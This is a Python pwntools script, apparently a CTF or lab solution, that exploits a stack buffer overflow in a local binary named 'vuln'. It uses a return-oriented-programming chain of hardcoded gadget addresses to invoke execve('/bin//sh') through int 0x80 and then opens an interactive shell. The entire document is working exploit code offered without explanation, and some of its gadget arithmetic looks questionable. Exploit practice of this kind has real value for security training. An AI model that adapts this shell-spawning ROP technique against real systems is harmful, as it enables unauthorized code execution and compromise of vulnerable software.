#coding=utf-8
from pwn import *

p = process('./vuln')
main = 0x80488dd
buf = 0xffffd4a0
ret = 0xffffd4bc
ebp = 0xffffd4d8

# pop eax ; ret
pop_eax = 0x080a8e36 
# xor eax, eax ; ret
xor_eax_eax = 0x08056420
# pop ecx ; pop ebx ; ret
pop_ecx_pop_ebx = 0x0806ee92
# nop ; nop ; int 0x80
int_0x80 = 0x0806f79c
# pop edx ; pop ecx ; pop ebx ; ret
pop_edx_ecx_ebx = 0x0806ee91
# pop edx ; ret
pop_edx = 0x806ee6b
# pop ebx ; ret
pop_ebx = 0x80481c9
# mov eax, ebp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
mov_eax_ebp = 0x0804d1c1
# push eax ; adc al, 0x7c ; and dword ptr [esi + 0x1a], edi ; pop ebx ; ret
push_eax_pop_ebx = 0x0806f13b
# nop ; inc eax ; ret
inc_eax = 0x0807c2f9

payload = 'a' * (ret - buf)
payload += p32(pop_edx_ecx_ebx)
payload += p32(0x6e69622f)
payload += p32(0x68732f2f)
payload += p32(0x0)
payload += p32(pop_ecx_pop_ebx)
payload += p32(0x0)
payload += p32(0x0)
payload += p32(inc_eax) * (ret - buf + 4)
payload += p32(push_eax_pop_ebx)
payload += p32(pop_edx)
payload += p32(0x0)
#payload += p32(pop_eax)
#payload += p32(0xb)
payload += p32(xor_eax_eax)
payload += p32(inc_eax) * 0xb
payload += p32(int_0x80)

p.sendline(payload)
p.interactive()
